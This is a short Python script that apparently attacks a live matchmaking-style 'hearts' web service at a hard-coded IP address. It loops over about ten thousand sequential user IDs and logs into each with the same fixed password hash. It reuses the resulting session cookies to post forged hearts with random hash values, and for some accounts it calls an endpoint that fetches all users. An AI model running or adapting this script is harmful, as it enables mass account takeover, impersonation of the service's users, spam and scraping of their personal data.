import requests
import json
import random
import hashlib
import concurrent.futures

headers = {
    'Content-Type': 'application/json',
}

def process_id(id):
    payload = json.dumps({
        "_id": str(id),
        "passHash": "aaaa",
    })

    url = "http://4.240.83.89:8080/session/login"

    session = requests.Session()
    response = session.post(url, headers=headers, data=payload)
    print(response.text, id)
    cookie = response.headers.get("Set-Cookie").split(";")[0]
    
    headers_with_cookie = {
        'Content-Type': 'application/json',
        'Cookie': cookie
    }
    
    hearturl = "http://4.240.83.89:8080/users/sendheart"
    fetch_url = "http://4.240.83.89:8080/users/fetchall"
    if(id%20 ==12):
        res = requests.get(fetch_url, headers=headers_with_cookie)
        print("fetching", id)
    
    hearts = json.dumps({
        "genderOfSender": "1",
        "enc1": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "sha1": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "enc2": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "sha2": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "enc3": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "sha3": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "enc4": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "sha4": hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
        "returnhearts": [
            {
                "enc": "",
                "sha": ""
            }
        ]
    })

    response = requests.post(hearturl, headers=headers_with_cookie, data=hearts)
    print(response.text, id)
    return

def main():

    # for id in range(210000, 219999):
    #     process_id(id)
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        ids = range(210000, 219999)
        executor.map(process_id, ids)

if __name__ == "__main__":
    main()
